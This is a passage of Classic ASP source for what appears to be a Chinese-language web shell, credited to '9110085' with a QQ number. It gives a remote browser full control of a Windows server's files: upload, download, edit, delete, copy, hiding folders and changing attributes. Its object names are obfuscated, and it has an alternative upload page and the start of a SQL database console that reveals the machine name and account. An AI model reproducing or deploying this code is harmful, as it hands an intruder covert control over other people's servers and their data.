ADOX=uep(&quot;醇纯词从穿淳窜达窜寸搓粹&quot;)
adodb=uep(&quot;窜催搓催摧穿崔搓撮撮脆崔达翠搓撮&quot;)
WSHELL=uep(&quot;匆次淳赐茨此聪穿次疵蠢辞辞&quot;)
WNETWORK=uep(&quot;匆次淳赐茨此聪穿瓷蠢聪匆词赐雌&quot;)
Dictionary=uep(&quot;次崔错翠措达翠撮粹穿纯翠崔达翠搓撮窜错呆&quot;)
AdodbS=uep(&quot;醇催搓催摧穿次达错脆窜磋&quot;)
::response.write &quot;&quot;&amp;bbf&amp;&quot;&lt;!endconfig&gt;&quot;
bbf=chr(13)&amp;chr(10):y=chr(34):self=Request(&quot;URL&quot;)
'-------------------------------------------------------------

'-------------------------------------------------------------
function echo(lpstr):response.write lpstr:end function
'-------------------------------------------------------------
function close():echo &quot;&lt;script&gt;opener.document.location.reload();opener=null;self.close();&lt;/script&gt;&quot;:response.end:end function
'-------------------------------------------------------------
::response.write &quot;&quot;&amp;bbf&amp;&quot;&lt;body Leftmargin=6 Topmargin=2&gt;&quot;&amp;bbf&amp;&quot;&quot;:
'set fs= server.createobject(fso)
fdo=lcase(request(&quot;fdo&quot;))
fp1=request(&quot;fp1&quot;)
fp2=request(&quot;fp2&quot;)
'response.end
if fdo=&quot;up&quot; and Request.TotalBytes&gt;20 then
	set dr1=server.CreateObject(AdodbS):dr1.Mode=3:dr1.Type=1:dr1.Open
	set dr2=server.CreateObject(AdodbS):dr2.Mode=3:dr2.Type=1:dr2.Open
	lnBytes=Request.BinaryRead(Request.TotalBytes)
	SignLen=Instrb(1,lnBytes,CStrB(bbf))-1
	Sign=MidB(lnBytes,1,SignLen)
	fname=tractName(getfilename()) '取文件名
	fp1=getvalue(&quot;fp1&quot;) '取路径值
	if fname&lt;&gt;&quot;&quot; and fp1&lt;&gt;&quot;&quot; then
		savefile(fp1&amp;fname)
	else
		echo &quot;文件名或路径错!&quot;
	end if
	dr1.Close
	dr2.Close
	set dr1=nothing
	set dr2=nothing
	response.redirect self&amp;&quot;?fp1=&quot;&amp;parentdir(fp1&amp;&quot;\&quot;)
end if
if fdo=&quot;down&quot; then
	downFile(fp1)
	response.end
end if
if fdo=&quot;hide&quot; then
	fp1=pn(fp1):fp2=fp1&amp;&quot;\desktop.ini&quot;
	if not fs.fileExists(fp2) then
	fs.getfolder(fp1).attributes=22
	lr=&quot;[.ShellClassInfo]&quot;+bbf+&quot;CLSID={645FF040-5081-101B-9F08-00AA002F954E}&quot;
	fs.createtextfile(fp2).Write lr
	fs.getfile(fp2).attributes=6
	echo &quot;&lt;script&gt;alert('此目录已隐藏！');&quot;
	else
	fs.getfolder(fp1).attributes=48
	fs.DeleteFile fp2,True
	echo &quot;&lt;script&gt;alert('此目录已解除隐藏！');&quot;
	end if
	echo &quot;history.go(-1);&lt;/script&gt;&quot;:response.end
end if
if fdo=&quot;adddir&quot; then
	fp1=pn(fp1):fs.createfolder(fp1)
	response.redirect self&amp;&quot;?fp1=&quot;&amp;fp1&amp;&quot;\&quot;
end if
if fdo=&quot;newfile&quot; then
	fp1=pn(fp1):if not fs.fileExists(fp1) then fs.createtextfile(fp1)
	response.redirect self&amp;&quot;?fp1=&quot;&amp;parentdir(fp1&amp;&quot;\&quot;)
end if
if fdo=&quot;sedit&quot; then
        fs.getfile(fp1).attributes=32
	fs.CreateTextFile(fp1).Write Request(&quot;fp2&quot;)
	close
end if
if fdo=&quot;gedit&quot; then
	att=fs.getfile(fp1).attributes
	echo &quot;&lt;form METHOD=POST action=&quot;&quot;&quot;&amp;self&amp;&quot;&quot;&quot;&gt;&lt;input type=text name=fp1 value=&quot;&quot;&quot;&amp;fp1&amp;&quot;&quot;&quot;&gt;&lt;br&gt;&quot;
	echo &quot;&lt;input name=fdo value=sedit type=hidden&gt;&lt;_textarea cols=90 rows=20 name=fp2&gt;&quot;
	wj=fs.OpenTextFile(fp1,1,0,0).read(5000000)
	echo replace(replace(wj,&quot;&lt;/text&quot;&amp;&quot;area&gt;&quot;,&quot;&lt;/_text&quot;&amp;&quot;area&gt;&quot;),&quot;&lt;/TEXT&quot;&amp;&quot;AREA&gt;&quot;,&quot;&lt;/_te&quot;&amp;&quot;xtarea&gt;&quot;)
	echo &quot;&lt;/_textarea&gt;&lt;center&gt;&lt;input type=submit value=-------保存-------&gt; &lt;a onclick=opener=null;self.close();&gt;放弃&lt;/a&gt;&lt;/form&gt;&quot;
	response.write &quot;&lt;script&gt;&quot;
response.write &quot;function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi&lt;100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}&quot;
response.write &quot;function ccc()&quot;
response.write &quot;{&quot;
response.write &quot;var tx;&quot;
response.write &quot;tx=document.all.fp2.value;&quot;
response.write &quot;tx=replace(tx,&quot;&quot;_tex&quot;+&quot;tarea&quot;&quot;,&quot;&quot;_textarea&quot;&quot;);&quot;
response.write &quot;document.all.fp2.value=tx;&quot;
response.write &quot;};&quot;
response.write &quot;ccc()&quot;
response.write &quot;&lt;/script&gt;&quot;
	response.end
end if
if fdo=&quot;ren&quot; then
	if fs.fileExists(fp1) then fs.movefile fp1,fp2
	if fs.folderExists(fp1) then fp1=pn(fp1):fs.movefolder fp1,pn(fp2):fp1=fp2
	response.redirect self&amp;&quot;?fp1=&quot;&amp;parentdir(fp1&amp;&quot;\&quot;)
end if
if fdo=&quot;del&quot; then
	if fs.fileExists(fp1) then fs.DeleteFile fp1,True
	if fs.folderExists(fp1) then fp1=pn(fp1):fs.Deletefolder fp1,True
	fp1=parentdir(fp1&amp;&quot;\&quot;)
	response.redirect self&amp;&quot;?fp1=&quot;&amp;parentdir(fp1&amp;&quot;\&quot;)
end if
if fdo=&quot;copy&quot; then
	if fs.fileExists(fp1) then fs.CopyFile fp1,fp2
	if fs.folderExists(fp1) then fs.Copyfolder pn(fp1),pn(fp2)
	close
end if
if fdo=&quot;sattr&quot; then
	if fs.fileExists(fp1) then fs.getfile(fp1).attributes=fp2 or 32
	if fs.folderExists(fp1) then fs.getfolder(fp1).attributes=fp2 or 32
	close
end if
if fdo=&quot;gattr&quot; then
	if fs.fileExists(fp1) then att=fs.getfile(fp1).attributes
	if fs.folderExists(fp1) then att=fs.getfolder(fp1).attributes
	echo &quot;&lt;form name=fgs METHOD=POST action=&quot;&quot;&quot;&amp;self&amp;&quot;&quot;&quot;&gt;&quot;&amp;fp1&amp;&quot;&lt;br&gt;&lt;input type=hidden name=fp1 value=&quot;&quot;&quot;&amp;fp1&amp;&quot;&quot;&quot;&gt;&quot;
	echo &quot;只读&lt;input type=checkbox name=c1 &quot;:if att and 1 then echo &quot;checked&quot;
	echo &quot;&gt;　隐藏&lt;input type=checkbox name=c2 &quot;:if att and 2 then echo &quot;checked&quot;
	echo &quot;&gt;　系统&lt;input type=checkbox name=c3 &quot;:if att and 4 then echo &quot;checked&quot;
	echo &quot;&gt;&lt;center&gt;&lt;br&gt;&lt;input name=fdo value=sattr type=hidden&gt;&lt;input name=fp2 value=&quot;&amp;att&amp;&quot; type=hidden&gt;&quot;
	echo &quot;&lt;a onclick='var s=0;if(c1.checked)s+=1;if(c2.checked)s+=2;;if(c3.checked)s+=4;fp2.value=s;fgs.submit();'&gt;修改&lt;/a&gt;&lt;/form&gt;&quot;
	response.end
end if
'开始
echo &quot;&lt;table border=0 cellspacing=0 cellpadding=0&gt;&lt;tr&gt;&lt;td&gt;&quot;
echo &quot;&lt;form name=fu method=post action=&quot;&quot;&quot;&amp;self&amp;&quot;?fdo=up&quot;&quot; enctype=multipart/form-data&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&quot;
for each d in fs.drives '盘符
	drv=d.DriveLetter
	echo &quot;&lt;a href=&quot;&quot;&quot;&amp;self&amp;&quot;?fp1=&quot;&amp;drv&amp;&quot;:\&quot;&quot;&gt;&quot;&amp;drv&amp;Tran(d.DriveType)&amp;&quot;&lt;/a&gt;　&quot;
next
'if fp1=&quot;&quot; then response.end
n=parentdir(fp1)
echo &quot;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;input type=hidden name=fp1 value=&quot;&quot;&quot;&amp;fp1&amp;&quot;&quot;&quot;&gt;&quot;
echo &quot;&lt;input type=file size=9 name=file1&gt;&lt;input type=submit value=上传&gt;&lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz target='_self'&gt;返回&lt;/a&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;&quot;
echo &quot;&lt;tr&gt;&lt;td&gt;&lt;form name=f&gt;&lt;input size=30 name=fp1 value=&quot;&quot;&quot;&amp;fp1&amp;&quot;&quot;&quot;&gt;&lt;input type=submit value=转到&gt;&quot;
if n&lt;&gt;&quot;&quot; then
	echo &quot;&lt;a href=# onclick=&quot;&quot;sattw('&quot;&amp;replace(fp1,&quot;\&quot;,&quot;/&quot;)&amp;&quot;')&quot;&quot;&gt;属性&lt;/a&gt; &quot;
	echo &quot;&lt;a href=# onclick=&quot;&quot;cpy('&quot;&amp;replace(fp1,&quot;\&quot;,&quot;/&quot;)&amp;&quot;')&quot;&quot;&gt;复制&lt;/a&gt; &quot;
	echo &quot;&lt;a href='&quot;&amp;self&amp;&quot;?fdo=del&amp;fp1=&quot;&amp;fp1&amp;&quot;'&gt;删除&lt;/a&gt; &quot;
	echo &quot;&lt;a href='&quot;&amp;self&amp;&quot;?fdo=hide&amp;fp1=&quot;&amp;fp1&amp;&quot;'&gt;隐藏&lt;/a&gt; &quot;
	echo &quot;&lt;a href=&quot;&quot;javascript:location='&quot;&amp;self&amp;&quot;?fdo=ren&amp;fp1=&quot;&amp;replace(fp1,&quot;\&quot;,&quot;/&quot;)&amp;&quot;&amp;fp2='+document.all.f.fp1.value;&quot;&quot;&gt;改名&lt;/a&gt; &quot;
end if
if fp1&lt;&gt;&quot;&quot; then
echo &quot;&lt;a href=&quot;&quot;javascript:location='&quot;&amp;self&amp;&quot;?fdo=adddir&amp;fp1=&quot;&amp;replace(fp1,&quot;\&quot;,&quot;/&quot;)&amp;&quot;'+document.all.fu.file1.value;&quot;&quot;&gt;新文件夹&lt;/a&gt; &quot;
echo &quot;&lt;a href=&quot;&quot;javascript:location='&quot;&amp;self&amp;&quot;?fdo=newfile&amp;fp1=&quot;&amp;replace(fp1,&quot;\&quot;,&quot;/&quot;)&amp;&quot;'+document.all.fu.file1.value;&quot;&quot;&gt;新文件&lt;/a&gt; &quot;
echo &quot; &lt;a href=# onclick=downall();&gt;下载&lt;/a&gt;　　&quot;
end if
echo &quot;本文件：[&lt;a href=&quot;&quot;&quot;&amp;self&amp;&quot;?fp1=&quot;&amp;server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&quot;&gt;目&lt;/a&gt;]&quot;
sef=replace(request(&quot;PATH_TRANSLATED&quot;),&quot;\&quot;,&quot;/&quot;)
echo &quot;[&lt;a target=_BLANK href='&quot;&amp;self&amp;&quot;?fdo=gedit&amp;fp1=&quot;&amp;sef&amp;&quot;'&gt;编&lt;/a&gt;]&quot;
echo &quot;[&lt;a href='&quot;&amp;self&amp;&quot;?fdo=del&amp;fp1=&quot;&amp;sef&amp;&quot;'&gt;删&lt;/a&gt;]&quot;
echo &quot;[&lt;a href=javascript:sattw(&quot;&quot;&quot;&amp;sef&amp;&quot;&quot;&quot;)&gt;属&lt;/a&gt;]&quot;
echo &quot;[&lt;a href=javascript:cpy(&quot;&quot;&quot;&amp;sef&amp;&quot;&quot;&quot;)&gt;复&lt;/a&gt;]&quot;
echo &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&quot;
if n&lt;&gt;&quot;&quot; then echo &quot;[&lt;a href=&quot;&quot;&quot;&amp;self&amp;&quot;?fp1=&quot;&amp;n&amp;&quot;&quot;&quot;&gt;&lt;font color=#FF0000&gt;上级目录..&lt;/font&gt;&lt;/a&gt;]&quot;
if fp1=&quot;&quot; then response.end
Set fdir=fs.GetFolder(fp1) '目录
c=0:For each n in fdir.SubFolders
	c=c+1:echo &quot;[&lt;a href=&quot;&quot;&quot;&amp;self&amp;&quot;?fp1=&quot;&amp;fp1&amp;n.name&amp;&quot;\&quot;&quot;&gt;&quot;&amp;n.name&amp;&quot;&lt;/a&gt;]&quot;
Next::response.write &quot;总共个&lt;font color=red&gt;&quot;::response.write c::response.write &quot;&lt;/font&gt;子目录&lt;hr&gt;&quot;&amp;bbf&amp;&quot;&lt;table width=760 border=0 cellspacing=1 cellpadding=0&gt;&lt;script&gt;&quot;&amp;bbf&amp;&quot;&quot;:
echo &quot;var fp1=&quot;&quot;&quot;&amp;replace(fp1,&quot;\&quot;,&quot;\\&quot;)&amp;&quot;&quot;&quot;;&quot;
echo &quot;var url=&quot;&quot;&quot;&amp;replace(self,&quot;\&quot;,&quot;\\&quot;)&amp;&quot;&quot;&quot;;&quot;
::response.write &quot;var c=&quot;&quot;&quot;&quot;,itm=0,down=&quot;&quot;&quot;&quot;;&quot;&amp;bbf&amp;&quot;function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi&lt;1000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}&quot;&amp;bbf&amp;&quot;function ow(w){return window.open(&quot;&quot;&quot;&quot;,&quot;&quot;&quot;&quot;,&quot;&quot;scrollbars=no,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,height=300,width=&quot;&quot;+w);}&quot;&amp;bbf&amp;&quot;function cpy(srcf)&quot;&amp;bbf&amp;&quot;{w=ow(400);w.moveTo(100,200);&quot;&amp;bbf&amp;&quot;z=&quot;&quot;&lt;form method=post action=\&quot;&quot;&quot;&quot;+url+&quot;&quot;?fdo=copy\&quot;&quot;&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;从&lt;input size=53 name=fp1 value=\&quot;&quot;&quot;&quot;+srcf+&quot;&quot;\&quot;&quot;&gt;&lt;br&gt;到&lt;input size=53 name=fp2 value=\&quot;&quot;&quot;&quot;+srcf+&quot;&quot;\&quot;&quot;&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;center&gt;&lt;input type=submit value=--复制--&gt;&lt;/form&gt;&quot;&quot;&quot;&amp;bbf&amp;&quot;w.document.write(z);}&quot;&amp;bbf&amp;&quot;function sattw(srcf){w=ow(350);w.location=url+&quot;&quot;?fdo=gattr&amp;fp1=&quot;&quot;+srcf;}&quot;&amp;bbf&amp;&quot;function ren(f1,f2){location=url+&quot;&quot;?fdo=ren&amp;fp1=&quot;&quot;+fp1+f1+&quot;&quot;&amp;fp2=&quot;&quot;+fp1+document.all[f2].value;}&quot;&amp;bbf&amp;&quot;function downall(){ow(600).document.write(down);}&quot;&amp;bbf&amp;&quot;function sf(lpstr,lpsize)&quot;&amp;bbf&amp;&quot;{&quot;&amp;bbf&amp;&quot;var p1,p2,z;&quot;&amp;bbf&amp;&quot;if(!(parseInt((itm)/2)%2))c=&quot;&quot;#cccccc&quot;&quot;;else c=&quot;&quot;#ffffff&quot;&quot;;&quot;&amp;bbf&amp;&quot;itm++;&quot;&amp;bbf&amp;&quot;p1=&quot;&quot;&lt;td&gt;&lt;a href=\&quot;&quot;&quot;&quot;+url+&quot;&quot;?fdo=&quot;&quot;;&quot;&amp;bbf&amp;&quot;p2=&quot;&quot;&amp;fp1=&quot;&quot;+fp1+lpstr+&quot;&quot;\&quot;&quot;&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z=&quot;&quot;&quot;&quot;;if(itm%2)z=&quot;&quot;&lt;tr bgcolor=&quot;&quot;+c+&quot;&quot;&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;td&gt;&lt;a href='javascript:sattw(\&quot;&quot;&quot;&quot;+replace(fp1,&quot;&quot;\\&quot;&quot;,&quot;&quot;/&quot;&quot;)+lpstr+&quot;&quot;\&quot;&quot;)'&gt;属性&lt;/a&gt;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;td&gt;&lt;a target=_BLANK href=\&quot;&quot;&quot;&quot;+url+&quot;&quot;?fdo=gedit&amp;fp1=&quot;&quot;+fp1+lpstr+&quot;&quot;\&quot;&quot;&gt;编辑&lt;/a&gt;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;td&gt;&lt;a href='javascript:cpy(\&quot;&quot;&quot;&quot;+replace(fp1,&quot;&quot;\\&quot;&quot;,&quot;&quot;/&quot;&quot;)+lpstr+&quot;&quot;\&quot;&quot;)'&gt;复制&lt;/a&gt;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;td width=178&gt;&lt;input size=20 name=o&quot;&quot;+itm+&quot;&quot; value=\&quot;&quot;&quot;&quot;+lpstr+&quot;&quot;\&quot;&quot; style=background-color:&quot;&quot;+c+&quot;&quot;;&gt;&lt;a onclick=ren(\&quot;&quot;&quot;&quot;+lpstr+&quot;&quot;\&quot;&quot;,\&quot;&quot;o&quot;&quot;+itm+&quot;&quot;\&quot;&quot;);&gt;改名&lt;/a&gt;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;if(lpsize&gt;0){z+=p1+&quot;&quot;down&quot;&quot;+p2+&quot;&quot;下载&lt;/a&gt;&lt;/td&gt;&quot;&quot;;down+=&quot;&quot;[&lt;a href=\&quot;&quot;&quot;&quot;+url+&quot;&quot;?fdo=down&quot;&quot;+p2+lpstr+&quot;&quot;&lt;/a&gt;]&quot;&quot;;}else z+=&quot;&quot;&lt;td&gt;&lt;/td&gt;&quot;&quot;&quot;&amp;bbf&amp;&quot;z+=p1+&quot;&quot;del&quot;&quot;+p2+&quot;&quot;删除&lt;/a&gt;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;z+=&quot;&quot;&lt;td title='&quot;&quot;+lpsize/1000000+&quot;&quot;M&quot;&quot;+&quot;&quot;' ondblclick=location='&quot;&quot;+url+&quot;&quot;?gl=sql&amp;sahost=&quot;&quot;+replace(fp1,&quot;&quot;\\&quot;&quot;,&quot;&quot;/&quot;&quot;)+lpstr+&quot;&quot;';&gt;&quot;&quot;+lpsize+&quot;&quot;&lt;/td&gt;&quot;&quot;;&quot;&amp;bbf&amp;&quot;if(!(itm%2))z+=&quot;&quot;&lt;/tr&gt;&quot;&quot;;else z+=&quot;&quot;&lt;td bgcolor=#aaaaaa width=30&gt; &lt;/td&gt;&quot;&quot;&quot;&amp;bbf&amp;&quot;document.write(z);&quot;&amp;bbf&amp;&quot;}&quot;&amp;bbf&amp;&quot;&quot;:c=0:For each n in fdir.Files '文件
	c=c+1:echo &quot;sf('&quot;&amp;n.name&amp;&quot;','&quot;&amp;n.size&amp;&quot;');&quot;
next
echo &quot;&lt;/script&gt;&lt;/table&gt;以上总共&lt;font color=red&gt;&quot;&amp;c&amp;&quot;&lt;/font&gt;个文件&lt;hr&gt;&quot;

function getvalue(lpitem)
	pstr=&quot;name=&quot;&amp;chr(34)&amp;lpitem&amp;chr(34)
	startpos=instrb(1,lnBytes,CstrB(pstr))
	if startpos&lt;2 then getvalue=&quot;&quot;:exit function
	startpos=instrb(startpos,lnBytes,CstrB(bbf&amp;bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getvalue=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
function getfdata()
	dim lpdata(1)
	startpos=instrb(1,lnBytes,CstrB(&quot;filename=&quot;&quot;&quot;))
	if startpos&lt;2 then getfdata=&quot;&quot;:exit function
	startpos=instrb(startpos,lnBytes,CStrB(bbf&amp;bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getfdata=(startpos-1)&amp;&quot;,&quot;&amp;(EndPos-startpos)
end function
function savefile(lpFileName)
	fdata=getfdata()
	fdata=split(fdata,&quot;,&quot;)
	if fdata(0)&lt;1 or fdata(1)&lt;1 then savefile=-1:exit function
	dr1.write lnBytes
	dr1.position=fdata(0)
	dr1.copyto dr2,fdata(1)
	dr2.SaveToFile lpFileName,2
end function
function getfilename()
	startpos=instrb(1,lnBytes,CstrB(&quot;filename=&quot;&amp;chr(34)))+10
	if startpos&lt;2 then getfilename=&quot;&quot;:exit function
	EndPos=instrb(startpos,lnBytes,CstrB(&quot;&quot;&quot;&quot;))
	getfilename=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function

Function tractName(lpfilename)
	nlen=len(lpfilename)
	For lpx = nlen To 1 step -1
		if mid(lpfilename,lpx,1)=&quot;\&quot; then
			tractName=mid(lpfilename,lpx+1,100)
			exit Function
		end if
	Next
	tractName=&quot;&quot;
End Function
function parentdir(t)
	ls=split(t,&quot;\&quot;)
	for x=0 to ubound(ls)-2
	parentdir=parentdir+ls(x)&amp;&quot;\&quot;
	next
End function
function pn(t)
	pn=replace(t,&quot;/&quot;,&quot;\&quot;)
	if right(pn,1)=&quot;\&quot; then pn=left(pn,len(pn)-1)
	if right(pn,1)=&quot;\&quot; then pn=left(pn,len(pn)-1)
End function
function downFile(strFile)
	Response.Buffer = True
	Response.Clear
	Set s=Server.CreateObject(AdodbS)
	s.Open
	s.Type=1
	if not fs.FileExists(strFile) then Response.Write(strFile&amp;&quot;文件不存在！&quot;):Response.End
	Set f=fs.GetFile(strFile)
	intFilelength=f.size
	s.LoadFromFile(strFile)
	if err then Response.Write(&quot;读文件出错:&quot;&amp;err.Description):Response.End
	Response.AddHeader &quot;Content-Disposition&quot;, &quot;attachment; filename=&quot; &amp; f.name
	Response.AddHeader &quot;Content-Length&quot;, intFilelength
	Response.CharSet = &quot;UTF-8&quot;
	Response.ContentType = &quot;application/octet-stream&quot;
	Response.BinaryWrite s.Read
	response.flush
	response.clear
	s.Close
	Set s = Nothing
End Function 
function Tran(drv)
select case drv:case 0:Tran=&quot;怪盘&quot;:case 1:Tran=&quot;软盘&quot;:case 2:Tran=&quot;硬盘&quot;
case 3:Tran=&quot;网络&quot;:case 4:Tran=&quot;光盘&quot;:case 5:Tran=&quot;RAM&quot;:end select:end function
response.end
end if
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''免FSO

if Session(&quot;gl&quot;)=&quot;nofso&quot; then
response.clear
echo&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;title&gt;9110085专用版---&gt;9110085制作 QQ：5910345 服务器时间：&quot;&amp;now()&amp;&quot; &lt;/title&gt;&quot;
echo&quot;&lt;META http-equiv=Content-Type content=text/html; charset=gb2312&gt;&quot;
echo&quot;&lt;STYLE type=text/css&gt;TD {&quot;
echo&quot; FONT-SIZE: 12pt}&quot;
echo&quot;TEXTAREA { FONT-SIZE: 9pt}&quot;
echo&quot;BODY { FONT-SIZE: 12pt}&quot;
echo&quot;TABLE {BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #ffffff}&quot;
echo&quot;INPUT {BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #efefef}&quot;
echo&quot;.small { FONT-SIZE: 8pt}&lt;/STYLE&gt;&quot;

if request(&quot;up&quot;)=&quot;yes&quot; then

strFileName = Request.Form(&quot;file1&quot;)

filepath=Request.Form(&quot;filepath&quot;)

if instr(filepath,&quot;:&quot;)&gt;0 then
if right(filepath,1)&lt;&gt;&quot;\&quot; then filepath=filepath&amp;&quot;\&quot;
else
filepath=Server.MapPath(filepath)
if right(filepath,1)&lt;&gt;&quot;/&quot; then filepath=filepath&amp;&quot;\&quot;
end if

Set objStream = Server.CreateObject(&quot;ADODB.Stream&quot;)
objStream.Type = 1
objStream.Open
objStream.LoadFromFile strFileName
objStream.SaveToFile filepath &amp; GetFileName(strFileName),2
objStream.Close
response.write &quot;&lt;p align=center&gt;&quot; &amp; GetFileName(strFileName) &amp; &quot;上传成功&lt;br&gt;路径：&quot;&amp;filepath &amp; GetFileName(strFileName)&amp;&quot;&lt;br&gt;&lt;a href='&quot;&amp;filename&amp;&quot;?upfile=yes'&gt;再传&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz target='_self'&gt;返回&lt;/a&gt;&quot;

response.end
end if

Function GetFileName(ByVal strFile)
If strFile &lt;&gt; &quot;&quot; Then
GetFileName = mid(strFile,InStrRev(strFile, &quot;\&quot;)+1)
Else
GetFileName = &quot;&quot;
End If
End function

response.Write &quot;&lt;div align='center'&gt;&lt;p&gt;&lt;font color='#FF0000' size=+2&gt;免FSO上传&lt;/font&gt;&lt;/p&gt;&quot;
response.Write &quot;&lt;TABLE height=58 cellSpacing=0 cellPadding=0 width=347 border=0&gt;&quot;
response.Write &quot;&lt;FORM name=form11 action=?up=yes method=post&gt;&quot;
response.Write &quot;&lt;TBODY&gt;&quot;
response.Write &quot;&lt;TR vAlign=center align=middle&gt;&quot;
response.Write &quot;&lt;TD height=30&gt;上传路径：&lt;FONT color=#ffffff&gt; &lt;INPUT size=30 value=/ name=filepath&gt; &lt;/FONT&gt;&lt;/TD&gt;&lt;/TR&gt;&quot;
response.Write &quot; &lt;TR vAlign=center align=middle&gt;&quot;
response.Write &quot;&lt;TD height=28&gt;&lt;INPUT type=file size=25 name=file1&gt; &lt;INPUT type=submit value=' 上传 ' name=Submit&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;/FORM&gt;&lt;/TBODY&gt;&lt;/TABLE&gt;&quot;
response.Write &quot;&lt;br&gt;&lt;a href=&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?gl=pz target='_self'&gt;返回&lt;/a&gt;&quot;
response.Write &quot;&lt;/div&gt;&quot;

end if




''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''数据库
if Session(&quot;gl&quot;)=&quot;sql&quot;   then
response.clear
if request(&quot;sahost&quot;)&lt;&gt;&quot;&quot; then sqlhostz=request(&quot;sahost&quot;)
if Session(&quot;sqlts&quot;)=&quot;&quot; then Session(&quot;sqlts&quot;)=20
if request(&quot;sqlts&quot;)&lt;&gt;&quot;&quot; then Session(&quot;sqlts&quot;)=request(&quot;sqlts&quot;)
sqlss=&quot;top &quot;&amp;Session(&quot;sqlts&quot;)
if Session(&quot;sqlts&quot;)=&quot;0&quot; then sqlss=&quot; &quot;
echo &quot;&lt;title&gt;机器名：&quot;&amp;oScriptNet.ComputerName&amp;&quot;;帐号：&quot;&amp;oScriptNet.UserName&amp;&quot;;WEB路径：&quot;&amp;request.servervariables(&quot;APPL_PHYSICAL_PATH&quot;)&amp;&quot;;ADSIPath：&quot;&amp;request.servervariables(&quot;APPL_MD_PATH&quot;)&amp;&quot;;服务器时间：&quot;&amp;now()&amp;&quot;	&lt;/title&gt;&quot;
echo &quot;&lt;meta http-equiv=&quot;&quot;pragma&quot;&quot; content=&quot;&quot;no-cache&quot;&quot;&gt;&lt;style&gt;&quot;
echo &quot;form {color:#00000;font-size:9pt;}&quot;
echo &quot;table {color:#00000;font-size:9pt;}&quot;
echo &quot;body {color:#00000;font-size:9pt;}&quot;
echo &quot;span {cursor:hand;color:blue;}&quot;
echo &quot;&lt;/style&gt;&lt;script&gt;function copys(s){&quot;
echo &quot;document.all.sqlstr.value=s;&quot;
echo &quot;}&lt;/script&gt;&quot;
echo &quot;&lt;script&gt;&quot;
echo &quot;function nom(){event.cancelBubble = true;event.returnValue = false;return false;}&quot;
echo &quot;function click() {if (event.button==2) {movable=(!movable);}nom();}&quot;
echo &quot;document.oncontextmenu=click;&quot;
echo &quot;document.onmousedown=click;&quot;
echo &quot;&lt;/script&gt;&quot;
echo &quot;&lt;body Leftmargin=&quot;&quot;6&quot;&quot; Topmargin=&quot;&quot;140&quot;&quot; onload=movediv()&gt;&quot;
echo &quot;&lt;script&gt;&quot;
echo &quot;var movable=0;&quot;
echo &quot;function movediv(){&quot;
echo &quot;if(movable==1){&quot;
echo &quot;toolb.style.pixelTop= document.body.scrollTop;&quot;
echo &quot;toolb.style.pixelLeft= document.body.scrollLeft;&quot;
echo &quot;movs.innerHTML=&quot;&quot;不浮动&quot;&quot;;}&quot;
echo &quot;else{toolb.style.pixelTop= 0;toolb.style.pixelLeft= 0;&quot;
echo &quot;movs.innerHTML=&quot;&quot;浮动&quot;&quot;;}&quot;
echo &quot;setTimeout('movediv()',200);&quot;
echo &quot;}&quot;
echo &quot;&lt;/script&gt;&quot;
echo &quot;&lt;div id=toolb style=&quot;&quot;position:absolute;Left:10px;Top:0px;width:100%&quot;&quot;&gt; &quot;
echo &quot;&lt;table cellspacing=0 cellpadding=0 width=100% border=1&gt;&lt;tr&gt;&lt;td&gt;&quot;
echo &quot;&lt;form action='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?table=&quot;&amp;request(&quot;table&quot;)&amp;&quot;' method=post&gt;&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=3'&gt;[显示库列表]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=1'&gt;[显示所有表]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=sel();&gt;[显示当前表]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=ins();&gt;[insert]&lt;/span&gt; --&quot;
